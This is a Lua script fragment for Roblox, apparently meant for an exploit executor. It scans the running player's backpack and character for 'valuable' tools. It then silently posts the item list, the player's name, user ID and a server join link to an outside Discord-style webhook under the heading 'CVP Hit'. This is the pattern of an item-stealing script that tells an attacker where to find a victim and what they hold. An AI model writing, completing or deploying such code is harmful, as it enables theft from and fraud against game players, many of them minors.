local function getItems()
    local found = {}
    for _, item in ipairs(lp.Backpack:GetChildren()) do
        if item:IsA("Tool") and isValuable(item.Name) then
            table.insert(found, item)
        end
    end
    if lp.Character then
        for _, item in ipairs(lp.Character:GetChildren()) do
            if item:IsA("Tool") and isValuable(item.Name) then
                table.insert(found, item)
            end
        end
    end
    return found
end

local function sendWebhook(items)
    local list = {}
    for _, item in ipairs(items) do table.insert(list, "• " .. item.Name) end
    
    -- Create join link for the server
    local joinLink = "https://www.roblox.com/games/" .. game.PlaceId
    
    local body = game:GetService("HttpService"):JSONEncode({
        content = "@everyone",
        embeds = {{
            title = "CVP Hit — " .. lp.Name,
            description = table.concat(list, "\n"),
            color = 5763719,
            footer = { text = lp.Name .. " • " .. lp.UserId },
            timestamp = DateTime.now():ToIsoDate(),
            fields = {{
                name = "Join Server",
                value = "[Click to Join](" .. joinLink .. ")",
                inline = false
            }}
        }}
    })
    pcall(function()
        local req = request or http_request or (syn and syn.request)
        req({ Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body })
    end)
end

